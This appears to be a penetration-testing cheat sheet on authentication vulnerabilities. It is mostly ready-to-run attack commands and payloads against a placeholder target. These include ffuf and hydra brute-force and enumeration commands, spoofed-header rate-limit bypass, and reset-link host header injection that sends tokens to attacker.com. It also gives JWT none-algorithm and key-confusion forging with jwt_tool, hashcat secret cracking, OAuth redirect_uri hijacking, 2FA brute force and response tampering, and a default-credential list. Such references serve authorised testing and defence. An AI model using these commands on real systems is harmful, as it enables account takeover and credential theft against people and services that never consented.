# Authentication Vulnerabilities

**CWE:** CWE-287 | **OWASP:** A07:2021

---

## 1. Username Enumeration

```bash
# Timing-based enumeration
# Different response times for valid vs invalid usernames

# Response content enumeration
# "User not found" vs "Password incorrect"

# Status code enumeration
# 200 vs 403

# ffuf for enumeration
ffuf -u https://target.com/login \
  -d "user=FUZZ&pass=wrongpassword" \
  -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
  -mc 200 -fr "Invalid username"

# Burp Intruder — compare response lengths/times
```

---

## 2. Password Brute Force

```bash
# After finding valid username
hydra -l valid@user.com \
  -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
  target.com https-post-form "/login:email=^USER^&password=^PASS^:Invalid credentials"

# Rate limit bypass headers (rotate)
X-Forwarded-For: 1.2.3.4
X-Originating-IP: 1.2.3.4
X-Remote-IP: 1.2.3.4

# IP rotation wordlist
ffuf -u https://target.com/login \
  -d "user=admin&pass=FUZZ" \
  -w passwords.txt \
  -H "X-Forwarded-For: FUZZ2" \
  -w2 ips.txt -mc 200
```

---

## 3. Password Reset Flaws

```bash
# Host header injection in reset link
# Intercept: POST /forgot-password
# Modify: Host: attacker.com
# Victim clicks link → token goes to attacker.com

# Predictable tokens
# Check if tokens are time-based, sequential, or low entropy
echo -n "user@email.com1700000000" | md5sum

# Token not expiring
# Request reset → use token hours/days later

# Token reuse
# Request reset → reset password → request again → old token still valid?

# User ID manipulation
POST /reset-password
token=validtoken&user_id=VICTIM_ID&new_password=hacked
```

---

## 4. JWT Attacks

```bash
# Decode JWT
echo "PAYLOAD_PART" | base64 -d

# None algorithm attack
# Modify header: {"alg": "none"}
# Modify payload: {"role": "admin"}
# Remove signature
# python3 jwt_tool.py TOKEN -X a

# Weak secret brute force
hashcat -a 0 -m 16500 jwt.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt

# jwt_tool for comprehensive JWT testing
python3 jwt_tool.py TOKEN -M pb   # Playbook scan
python3 jwt_tool.py TOKEN -X s    # Signature check attacks
python3 jwt_tool.py TOKEN -I -pc "role" -pv "admin"  # Inject claims

# JWK confusion (RS256 → HS256)
# Forge token signed with public key (server accepts it as HS256)
python3 jwt_tool.py TOKEN -X k -pk public.pem
```

---

## 5. OAuth / SSO Flaws

```bash
# redirect_uri manipulation
# Add parameter: redirect_uri=https://attacker.com
# Or path traversal: redirect_uri=https://target.com/../evil

# state parameter CSRF
# If state is missing or fixed → CSRF on OAuth flow

# Authorization code theft via Referer
# If redirect_uri page loads external resources
# The code leaks in Referer header to those resources

# Token leakage in URL
# response_type=token → token in URL fragment → logged in browser history

# Implicit flow token theft
# If token in URL → open redirect → attacker gets token

# Account linking abuse
# Link attacker-controlled OAuth account to victim's account
```

---

## 6. 2FA Bypass

```bash
# Direct endpoint access
# After entering credentials, skip /verify-2fa and go to /dashboard

# Response manipulation
# 2FA response: {"success": false, "2fa_required": true}
# Change to: {"success": true, "2fa_required": false}

# Brute force 2FA (if no rate limit)
# 6-digit TOTP: 1,000,000 combinations
ffuf -u https://target.com/2fa \
  -d "code=FUZZ" \
  -w <(seq -w 0 999999) \
  -mc 302 -t 50

# Code reuse
# Use same OTP after it was already consumed

# Backup code abuse
# Are backup codes single-use? Try reuse.
```

---

## 7. Default Credentials

```bash
# Check common defaults
admin:admin
admin:password
admin:123456
root:root
test:test
guest:guest
demo:demo

# Application-specific defaults
# Tomcat: tomcat:tomcat, admin:admin
# Jenkins: admin:(check /secrets/initialAdminPassword)
# Grafana: admin:admin
# Webmin: admin:admin
# phpMyAdmin: root:(empty)
# WordPress: admin:password

# SecLists default credentials
/usr/share/seclists/Passwords/Default-Credentials/
```
